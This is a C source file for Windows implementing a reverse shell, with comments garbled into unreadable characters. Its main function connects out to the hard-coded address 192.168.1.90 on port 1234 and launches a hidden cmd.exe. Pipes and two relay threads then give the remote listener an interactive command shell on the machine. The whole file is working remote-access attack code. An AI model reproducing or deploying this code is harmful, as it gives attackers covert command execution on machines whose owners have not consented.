#include <winsock2.h>
#include <mstcpip.h>
#include <windows.h>
#include <stdio.h>

 
#pragma comment(lib,"Ws2_32.lib")  
#pragma comment(lib,"Mswsock.lib")  


HANDLE m_hReadPipeHandle = NULL;
HANDLE m_hWritePipeHandle = NULL;
HANDLE m_hReadPipeShell = NULL;
HANDLE m_hWritePipeShell = NULL;
HANDLE m_hProcessHandle = NULL;
HANDLE m_hThreadHandle = NULL;

DWORD WINAPI ReadPipeThread(LPVOID lparam)
{

	SOCKET socket = (SOCKET)lparam;
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	while (1)
	{
		Sleep(100);
		//�������Ƿ�������  ���ݵĴ�С�Ƕ���
		while (PeekNamedPipe(m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			char lpBuffer[4096];
			//���û�����ݾ�����������ѭ��
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			//char* lpBuffer = (char*)malloc( 1 * TotalBytesAvail);
			//��ȡ�ܵ�����
			ReadFile(m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// ��������
			lpBuffer[BytesRead] = '\0';
			printf("[shell pip read]%s\n",lpBuffer);
			send(socket,lpBuffer,BytesRead,0);
			//free(lpBuffer);
			
		}
	}
	return 0;
}

DWORD WINAPI WritePipeThread(LPVOID lparam){
	char buf[4096];
	timeval  timeout={0};

	SOCKET socket = (SOCKET) lparam; 

    fd_set socketSet;  
    FD_ZERO(&socketSet);  
    FD_SET(socket,&socketSet);  

	fd_set readfds;
	FD_ZERO(&readfds);
	
	while(1){
		readfds = socketSet;
		//select���غ���޸�ÿ��fd_set�ṹ��ɾ�������ڵĻ�û�����IO�������׽��֡����ǿ���ʹ��FD_ISSET���ж�һ���׽����Ƿ����ڼ����е�ԭ��
		int nRet  = select(0,&readfds,NULL,NULL,NULL);
		if(nRet > 0){
			for(u_int i=0;i<socketSet.fd_count;i++)  
			{  
				if(FD_ISSET(socketSet.fd_array[i], &readfds))
				{  
					//����recv���������ݡ� 
					int nRecv = recv(socketSet.fd_array[i],buf,sizeof(buf),0);  
					if(nRecv > 0)  
					{  
						DWORD ByteWrite =0;
						buf[nRecv] = 0;  
						printf("\nrecv  %d :  %s len:%d", socketSet.fd_array[i],buf,nRecv);  

						WriteFile(m_hWritePipeHandle, buf, nRecv, &ByteWrite, NULL);
					}else{
						printf("ɾ��socket %d\n",socketSet.fd_array[i]);
						closesocket(socketSet.fd_array[i]);
						FD_CLR(socketSet.fd_array[i],&socketSet);
					}
				} 
			}

		}else if(nRet == 0){
			printf("select timeout \n");
		}else  {  
            printf("select error!%d\n",WSAGetLastError());  
            break; 
        }
	}
	return 0;
}


SOCKET getCon(char *ip,int nPort){
	SOCKET m_Socket;
	//�������ӵ��׽���

    WSAData wsaData;  
    if(0 != WSAStartup(MAKEWORD(2,2),&wsaData))  
    {  
        printf("��ʼ��ʧ��!%d\n",WSAGetLastError());  
        Sleep(5000);  
        return -1;  
    }

	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	if (m_Socket == SOCKET_ERROR)   
	{ 
		return NULL;   
	}

	hostent* pHostent = NULL;
	char lpszHost[256];
	gethostname(lpszHost,sizeof(lpszHost));
	pHostent = gethostbyname(lpszHost);	
	if (pHostent == NULL)
	{
		return NULL;
	}
	//����sockaddr_in�ṹ Ҳ�������ض˵Ľṹ
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);	
	ClientAddr.sin_addr.s_addr = inet_addr(ip);//htonl(INADDR_ANY); //*((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) 
	{
		return NULL;
	}
	// ���ñ�����ƣ��Լ�������ʵ��
#if 0
	const char chOpt = 1; // True
	// Set KeepAlive
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// ���ó�ʱ��ϸ��Ϣ
		tcp_keepalive	klive;
		klive.onoff = 1; // ���ñ���
		klive.keepalivetime = 1000 * 60 * 3; //
		klive.keepaliveinterval = 1000 * 5;  //
		WSAIoctl
			(
			m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
			);
	}
#endif
	return m_Socket;
}


int main(){
	SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 

	char strShellPath[MAX_PATH]={0};
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;
	SOCKET socket;
	socket = getCon("192.168.1.90",1234);
	if(!socket){
		printf("get Con failed!\n");
		return 1;
	}



    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)
		{
			CloseHandle(m_hReadPipeHandle);
		}
		if(m_hWritePipeShell != NULL)
		{
			CloseHandle(m_hWritePipeShell);
		}
		return 1;
    }
	
    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)
		{
			CloseHandle(m_hWritePipeHandle);
		}
		if(m_hReadPipeShell != NULL)
		{
			CloseHandle(m_hReadPipeShell);
		}
		return 1;
    }

	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));


	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;                           //���ܵ���ֵ
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 
	
	GetSystemDirectory(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");
    //����cmd����  ��ָ���ܵ�
	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return 1;
    }
	m_hProcessHandle = pi.hProcess;    //����Cmd���̵Ľ��̾�������߳̾��
	m_hThreadHandle	= pi.hThread;
	DWORD threadId;
	HANDLE m_hThreadRead = CreateThread(NULL, 0, ReadPipeThread,(LPVOID)socket, 0, &threadId); // �����߳�
	HANDLE m_hThreadWrite = CreateThread(NULL, 0, WritePipeThread, (LPVOID)socket, 0, &threadId); // �����߳�

	CloseHandle(m_hThreadWrite);


	HANDLE hThread[2];
	hThread[0] = m_hProcessHandle;
	hThread[1] = m_hThreadRead;

	//Sleep(10 * 1000);

	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	TerminateThread(m_hThreadRead, 0);
	TerminateProcess(m_hProcessHandle, 1);

	WSACleanup();  
	return 0;
}